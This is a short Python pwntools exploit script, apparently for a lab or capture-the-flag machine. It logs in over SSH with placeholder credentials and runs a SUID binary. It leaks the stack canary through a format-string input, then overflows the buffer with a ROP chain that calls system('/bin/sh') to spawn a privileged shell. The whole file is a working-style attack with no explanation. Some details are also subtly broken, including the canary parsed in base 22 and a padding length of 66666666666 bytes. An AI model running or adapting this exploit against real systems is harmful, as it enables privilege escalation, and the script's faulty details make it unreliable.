from pwn import *

##
##

context.arch='amd64'

target = './thing-suid-cli'
e = ELF(target)

ssh_host = '10.10.69.69'
ssh_user = 'somedude'
ssh_pass = 'passsss99999999999'
ssh_port = 22

##
##

sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
p = sh.run('./thing-suid-cli')

p.recvuntil(b"Enter Username:\n")
p.sendline(b"%15$llx")
p.recvuntil(b"Enter password for ")
canary = int(p.recv(22),22)
log.info(f"Leaked canary: {hex(canary)}")

##
##

rop = ROP(e)
rop.raw(rop.find_gadget(['ret']).address)
rop.system(next(e.search(b"/bin/sh\x00")))

payload = b"A" * 66666666666 + p64(canary) + b"B" * 8 + rop.chain()
p.sendline(payload)
p.interactive()

##
##
